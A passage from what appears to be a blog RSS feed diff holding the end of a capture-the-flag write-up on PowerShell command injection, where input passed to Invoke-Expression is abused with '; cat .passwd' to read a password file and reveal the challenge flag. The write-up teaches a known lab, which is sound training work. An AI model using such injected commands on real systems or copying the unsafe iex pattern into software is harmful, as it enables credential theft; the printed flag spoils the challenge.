-        &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;iex&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Write-Host Connect to the database With the secure Password: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$SecurePassword&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;
-. Backup the table &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$table&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Amazing. It is using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;iex&lt;/code&gt; CMDlet, which is the short for the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-Expression&lt;/code&gt; method used for executing code. That is why the subtitle of this CTF is “There’s UI, UX and IEX” xD&lt;/p&gt;
-
-&lt;p&gt;To solve this problem, we simply pass the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;; cat .passwd&lt;/code&gt;:&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Table to dump:
-&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .passwd
-Connect to the database With the secure Password: 76492d1116743f0423413b16050a5345MgB8ADY
-AbgBzADgAUQA4AG4AdwB3AGIAbgBNAFcAcgBYAE8AMgBWADkAQgB5AEEAPQA9AHwAYQA5ADcAZgAyAGIAOQA5ADIA
-YQBkADIAYwA0ADQAYQA3AGYAMAAxADgAZgA2AGUAMgAzAGYAOQA0AGYAZQBmADkAOQBiADUAZQBkADAAZQAwAGUAO
-AA3ADMAMAA1ADkAZQA0ADkAMAA0ADgANQA5ADIAZAA4ADQANgA2ADYAOQA0ADMAMQBlADMANQBjADEANAA0AGQAOQ
-AyAGMAYgAyADQANAA2AGUAZAA2ADYANgA1ADYAMABhADYAYgAwADcA. Backup the table
-SecureIEXpassword
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;And there we have it! The flag for this CTF is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SecureIEXpassword&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h1 id=&quot;conclusion&quot;&gt;&lt;a href=&quot;#conclusions&quot;&gt;&lt;/a&gt;Conclusion&lt;/h1&gt;
-
-&lt;p&gt;In this CTF, we learned a bit more about Powershell and command injection. The task was straightforward – to recover a database password within a Windows environment.&lt;/p&gt;
-
-&lt;p&gt;We first revised some Powershell concepts, as well as the definition of command injection attacks. The CTF setup led us to leverage the semicolon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; in Powershell to append and execute additional commands. By applying this technique, we successfully injected command within the environment.&lt;/p&gt;
-
-&lt;p&gt;As we can see, this is a simple Powershell CTF. By keeping our approach mindset, it was not difficult to find a way out to catch this flag!&lt;/p&gt;
-
-&lt;p&gt;Thanks for sticking ‘til the end. I hope you learned something new today! And remember, always do your &lt;strong&gt;research!&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;a href=&quot;/&quot;&gt;Go back&lt;/a&gt;&lt;/p&gt;
-
-</description>
-        <pubDate>Wed, 06 Dec 2023 00:00:00 +0000</pubDate>
-        <link>http://localhost:4000//powershell-command-injection-root-me</link>
-        <link href="http://localhost:4000/powershell-command-injection-root-me"/>
-        <guid isPermaLink="true">http://localhost:4000/powershell-command-injection-root-me</guid>
       </item>
     
   </channel>
